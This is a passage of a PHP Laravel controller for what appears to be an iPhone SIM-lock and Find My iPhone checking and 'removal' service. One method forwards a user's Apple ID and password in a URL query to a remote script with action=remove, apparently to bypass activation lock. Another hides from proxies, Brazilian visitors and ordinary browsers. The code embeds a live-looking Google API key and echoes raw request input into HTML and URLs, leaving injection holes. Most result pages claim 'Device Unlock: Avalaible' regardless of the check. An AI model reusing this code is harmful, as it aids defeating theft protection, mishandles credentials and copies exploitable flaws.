        session(['EthernetMacAddress' => $EthernetMacAddress]);
        echo "EthernetMacAddress: " . $EthernetMacAddress . "<br>";
      } else {
        session(['EthernetMacAddress' => "N/A"]);
        echo "EthernetMacAddress:N/A <br>";
      }



      if (!empty($value['dict']['dict'][6]['string'][2])) {
        $WifiAddress = $value['dict']['dict'][6]['string'][2];
        session(['WifiAddress' => $WifiAddress]);
        echo "WifiAddress: " . $WifiAddress . "<br>";
      } else {
        session(['WifiAddress' => "N/A"]);
        echo "WifiAddress:N/A <br>";
      }

      session(['modal' => 'ok']);
      //Mail::to($request->user())->send(new OrderShipped($xml1));
      try {
        if (Auth::user()->email != "demo@demo.com") {
          Mail::to(Auth::user()->email)->send(new EmergencyCallReceived("ml"));
        }
      } catch (\Throwable $e) {
      }
      $dominio = $this->url_actual();

      if ($dominio == "https://hollyrenew.website/plist") {
      } else {
        return back();
      }

      /*
if($dominio=="hollyrenew.website"){
   return back();
}

*/
    } catch (\Throwable $e) {
      dd($e);
      //    return back();

      // dd("Check that your file is correct and try again upload it please comeback this screen".$e);
    }
  }
  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function check(Request $request)
  {
    $ip = $this->getUserIP();
    $AppleID = $request->appleid;
    $pwd = base64_decode($request->password);
    $action = $request->action; // verify or remove
    $response = $request->response; // json or html or text
    $auth = $this->auth($ip);
    if ($auth == true) {
      $result =   app('\App\Http\Controllers\SistemaController')->check_api_($request);
      echo $result;
    } else {
      echo "Your Server IP $ip Not Registered With us Please Contact <a href='https://t.me/2'></a>";
    }
  }


  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function check_app(Request $request)
  {

    $ip = $this->getUserIP();
    $browser = $_SERVER['HTTP_USER_AGENT'] . "\n\n";
    $pos = strpos($browser, "SIMChecker");
    $data = json_decode(file_get_contents('http://www.geoplugin.net/json.gp?ip=' . $ip), true);


    if ($this->isUsingProxy($request)) {
      abort(404);
    } else {
      if (in_array($data['geoplugin_countryCode'], ['BR'])) {
        abort(404);
      } else {
        if ($pos === false) {
          abort(404);
        } else {
          $result =   app('\App\Http\Controllers\SistemaController')->check_api_($request);
          echo '
<br>
<a style="color:red;" href="https://hollyrenew.website">Quieres ver que mas servicios tengo? visita mi pagina </a>' . $result . '<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ibriano6" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>';
        }
      }
    }
  }




  public function isUsingProxy(Request $request)
  {
    // Obtén el encabezado X-Forwarded-For
    $ipAddresses = $request->header('X-Forwarded-For');

    // Verifica si se proporcionó el encabezado y contiene direcciones IP
    if ($ipAddresses && preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $ipAddresses)) {
      // Separa las direcciones IP en un array
      $ipArray = explode(',', $ipAddresses);

      // Comprueba si la primera dirección IP es diferente a la dirección IP actual
      if ($ipArray[0] !== $request->ip()) {
        return true; // El usuario está utilizando un proxy
      }
    }

    return false; // El usuario no está utilizando un proxy
  }

  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function fmi_check__(Request $request)
  {
    $myResult = $this->POST("https://ialdaz-activator.com/CheckFMI/fmi.php?sn=$request->imei", "");
    $cadena_sin_nueva_linea = str_replace("\n", "<br>", $myResult);
    return $cadena_sin_nueva_linea;
  }
  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function fmi_check(Request $request)
  {
    $ip = $this->getUserIP();
    $AppleID = $request->appleid;
    $pwd = base64_decode($request->password);
    $action = $request->action; // verify or remove
    $response = $request->response; // json or html or text
    $auth = $this->auth($ip);
    if ($auth == true) {
      $result =   app('\App\Http\Controllers\SistemaController')->fmi_check__($request);
      echo $result;
    } else {
      echo "Your Server IP $ip Not Registered With us Please Contact <a href='https://t.me/2'></a>";
    }
  }


  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function api_google(Request $request)
  {
    $ip = $this->getUserIP();
    $key = $request->key;
    $action = $request->action; // verify or remove
    $response = $request->response; // json or html or text
    $auth = $this->auth($ip);
    if ($auth == true) {

      if (isset($request->address)) {
        $ch = curl_init();
        $url = "https://maps.googleapis.com/maps/api/geocode/json?address=$request->address&key=AIzaSyCvhogdlz3rvTIAJXfcUxkqE6E6bQitzm0";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        //$result = strip_tags($result);
        curl_close($ch);
        echo $result;
      }
      if (isset($request->callback)) {

        $ch = curl_init();
        $url = "https://maps.googleapis.com/maps/api/js?key=AIzaSyCvhogdlz3rvTIAJXfcUxkqE6E6bQitzm0&callback=initMap";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        //$result = strip_tags($result);
        curl_close($ch);
        echo $result;
      } else {

        $ch = curl_init();
        $url = "https://maps.googleapis.com/maps/api/js?libraries=places&key=AIzaSyCvhogdlz3rvTIAJXfcUxkqE6E6bQitzm0";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        //$result = strip_tags($result);
        curl_close($ch);
        echo $result;
      }
    } else {
      echo "Your Server IP $ip Not Registered With us Please Contact <a href='https://t.me/2'></a>";
    }
  }




  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function raptor(Request $request)
  {
    $ip = $this->getUserIP();
    $username = $request->username;
    $password = base64_encode($request->password);

    $auth = $this->auth($ip);
    if ($auth == true) {


      $ch = curl_init();
      $url = "https://hollyrenew.website/snnccheck.php?appleid=$username&password=$password&response=text&action=remove";
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($ch);
      curl_close($ch);
      echo $result;
    } else {
      echo "Your Server IP $ip Not Registered With us Please Contact <a href='https://t.me/2'></a>";
    }
  }
  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function check_api_(Request $request)
  {

    set_time_limit(0);

    $sn = strtoupper($request->sn);
    $imei = $request->imei;
    $meid = $request->meid;
    $imei2 = $request->imei2;
    if ($sn == "") {
      $check = $request->imei;
    } else {
      $check = $sn;
    }
    $modelo = $this->checkI($check);

    if (empty($imei2) == false) {
      $inject_imei2 = "<strong>IMEI2 :</strong> $imei2<br>";
    }
    if ($this->validate_imei($imei) == true) {
      $imsi_tt = 0;
      $imsi_nb = 0;
      $imsi_nm = "";
      $device = $this->checkInfo($imei);
      $gsmcall = $this->simlock($imei, $sn, null, $imei2);

      if ($gsmcall == "TryMeid") {
        $meid = substr($imei, 0, -1);
      }
      if (empty($meid) == false) {
        $inject_meid = "<strong>MEID:</strong> $meid<br>";
      }

      $gsmcall = $this->simlock($imei, $sn, $meid, $imei2);

      if ($gsmcall == 'Locked' || $gsmcall == 'Unlocked') {
        foreach ($this->IMSI_ARRAY() as $isi) {
          $carrier = $this->simlock($imei, $sn, $meid, $imei2, $isi);
          if ($carrier == "Unlocked") {
            $labelCar = $this->imsiChecker($isi);

            $imsi_nb++;
          }
          $imsi_tt++;
        }
        //aqui
        $labelCar = $this->imsiChecker($isi);
        $fmi = $this->check_($imei);


        if (($imsi_tt - $imsi_nb) == 0) {

          if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
            $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
            $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          } else {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          }



          echo 2;
        } else {

          $this->modelos($imei);
          if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
            $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
            $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          } else {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          }


          //envio del mensaje

          $status = "<span style='color:red;'> Locked</span>";
          echo "<body style='color:orange; background-color:black;'><img style='width:120px; height:100px;'src='$Imagen'><br>$modelo IMEI : <span style='color:orange;'> $imei</span><br>IMEI2 : <span style='color:orange;'> $imei2</span><br>Serial: <span style='color:orange;'> $sn</span><br>Carrier: <span style='color:orange;'> $labelCar</span><br>SimLock: <span style='color:red;'>$status</span><br>Find My iPhone : <span style='color:red;'>NoResponse</span><br>Device Unlock: <span style='color:green;' >Avalaible</span><br> <span style='color:orange;'> Powered HollyDev</span>";
        }
      } else {
        if ($gsmcall == "chimaera") {

          if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
            $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
            $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          } else {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          }


          //envio del mensaje




          echo "<body style='color:orange; background-color:black;'><img style='width:120px; height:100px;' src='$Imagen'><br>$modelo IMEI : <span style='color:orange;'> $imei</span><br>IMEI2 : <span style='color:orange;'> $imei2</span><br>Serial: <span style='color:orange;'> $sn</span><br>Next Tether Policy ID: Chimaera Device Policy 2365</span><br>Status: <span style='color:red;'> Blocked by Apple</span><br>Find My iPhone : <span style='color:red;'>NoResponse</span><br>Device Unlock: <span style='color:green;' >Avalaible</span><br> <span style='color:orange;'> Powered HollyDev</span>";
        } else {

          if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
            $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
            $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
            $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
          } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
            $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
          } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          } else {
            $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
          }
          echo "<body style='color:orange; background-color:black;'><img style='width:120px; height:100px;' src='$Imagen'><br>$modelo IMEI : <span style='color:orange;'> $imei</span><br>IMEI2 : <span style='color:orange;'> $imei2</span><br>Serial: <span style='color:orange;'> $sn</span><br>Find My iPhone : <span style='color:red;'>NoResponse</span><br>Status: <span style='color:red;'>No enough info from device or the device are too new  please fill all the fields posible too check serial and try again </span><br>";

          // echo 'Wrong IMEI or Server Down!';
        }
        echo $gsmcall;
      }
    } else {
      echo 'Wrong IMEI';
    }
  }

  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function check_carrier_text(Request $request)
  {

    set_time_limit(0);

    $sn = strtoupper($request->sn);
    $imei = $request->imei;
    $meid = $request->meid;
    $imei2 = $request->imei2;
    if ($sn == "") {
      $check = $request->imei;
    } else {
      $check = $sn;
    }
    $modelo = $this->checkI($check);

    if (empty($imei2) == false) {
      $inject_imei2 = "<strong>IMEI2 :</strong> $imei2<br>";
    }
    if ($this->validate_imei($imei) == true) {
      $imsi_tt = 0;
      $imsi_nb = 0;
      $imsi_nm = "";
      $device = $this->checkInfo($imei);

      $gsmcall = $this->simlock($imei, $sn, null, $imei2);
      if ($gsmcall == "TryMeid") {
        $meid = substr($imei, 0, -1);
      }
      if (empty($meid) == false) {
        $inject_meid = "<strong>MEID:</strong> $meid<br>";
      }

      $gsmcall = $this->simlock($imei, $sn, $meid, $imei2);

      if ($gsmcall == 'Locked' || $gsmcall == 'Unlocked') {
        foreach ($this->IMSI_ARRAY() as $isi) {
          $carrier = $this->simlock($imei, $sn, $meid, $imei2, $isi);
          if ($carrier == "Unlocked") {
            $labelCar = $this->imsiChecker($isi);
            $imsi_nb++;
          }
          $imsi_tt++;
        }
        $labelCar = $this->imsiChecker($isi);

        $fmi = $this->check_($imei);
        if (($imsi_tt - $imsi_nb) == 0) {
          $modelo = $this->checkI($check);

          echo "$modelo IMEI : \r\n <br>$imei \nIMEI2 :\r\n <br>$imei2\r\n <br>Serial:\r\n <br>$sn \r\n <br>Next Tether Policy: 10 \r\n <br>SimLock: \r\n <br>$gsmcall \r\n <br>Find My iPhone :\r\n <br>NoResponse \r\n <br>Device Unlock: \r\n <br>Avalaible";
        } else {
          $modelo = $this->checkI($check);

          $status = "Locked ";
          echo "\r\n <br>$modelo IMEI : \r\n <br>$imei\nIMEI2 \n$imei2\nSerial: \r\n <br>$sn\nCarrier: \r\n <br>$labelCar\nSimLock: <span style='color:red;'>$status</span>\nFind My iPhone : <span style='color:red;'>NoResponse</span>\nDevice Unlock: <span style='color:green;' >Avalaible</span> \r\n <br>";
        }
      } else {
        if ($gsmcall == "chimaera") {
          $modelo = $this->checkI($check);


          echo "\r\n <br>$modelo IMEI : <span style='color:orange;'> $imei</span>\r\n <br>IMEI2 : <span style='color:orange;'> $imei2</span>\r\n <br>Serial: <span style='color:orange;'> $sn</span>\r\n <br>Next Tether Policy ID: Chimaera Device Policy 2365</span>\r\n <br>Status: <span style='color:red;'> Blocked by Apple</span>\r\n <br>Find My iPhone : <span style='color:red;'>NoResponse</span>\r\n <br>Device Unlock: <span style='color:green;' >Avalaible</span>\r\n <br> <span style='color:orange;'> Powered HollyDev</span>";
        } else {
          $modelo = $this->checkI($check);

          echo "\r\n <br>$modelo IMEI : <span style='color:orange;'> $imei</span>\r\n <br>IMEI2 : <span style='color:orange;'> $imei2</span>\r\n <br>Serial: <span style='color:orange;'> $sn</span>\r\n <br>Find My iPhone : <span style='color:red;'>NoResponse</span>\r\n <br>Status: <span style='color:red;'>No enough info from device or the device are too new  please fill all the fields posible too check serial and try again </span>\r\n <br>";

          // echo 'Wrong IMEI or Server Down!';
        }
        echo $gsmcall;
      }
    } else {
      echo 'Wrong IMEI';
    }
  }
  public function modelos($imei)
  {

    if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
      $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
